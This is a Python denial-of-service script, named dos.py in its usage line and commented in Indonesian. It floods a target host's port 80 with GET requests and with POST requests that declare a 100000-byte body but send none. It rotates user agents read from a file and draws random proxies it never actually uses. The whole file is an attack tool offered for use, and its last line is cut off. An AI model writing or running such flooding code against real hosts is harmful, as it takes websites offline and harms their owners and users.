import socket
import time
import random
import sys

# Daftar agen pengguna
user_agents = []

# Baca agen pengguna dari file
with open("ua.txt", "r") as f:
    for line in f:
        user_agents.append(line.strip())

# Daftar proxy
proxies = []

# Baca proxy dari file
with open("proxy.txt", "r") as f:
    for line in f:
        proxies.append(line.strip())

# Fungsi untuk mendapatkan agen pengguna acak
def get_random_user_agent():
    return random.choice(user_agents)

# Fungsi untuk mendapatkan proxy acak
def get_random_proxy():
    return random.choice(proxies)

# Fungsi untuk membuat permintaan dengan agen pengguna acak dan proxy
def make_request(host, time):
    for _ in range(int(time)):
        user_agent = get_random_user_agent()
        proxy = get_random_proxy()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, 80))
            sock.send(f"GET / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\n\r\n".encode())
            sock.close()
        except:
            pass

# Fungsi untuk membuat permintaan berat
def make_heavy_request(host, time):
    for _ in range(int(time)):
        user_agent = get_random_user_agent()
        proxy = get_random_proxy()
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((host, 80))
            sock.send(f"POST / HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {user_agent}\r\nContent-Length: 100000\r\n\r\n".encode())
            sock.close()
        except:
            pass

# Contoh penggunaan
if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Penggunaan: python dos.py {host} {time}")
        sys.exit()

    host = sys.argv[1]
    time = sys.argv[2]

    make_request(host, time)
    make_heavy_request(host, time
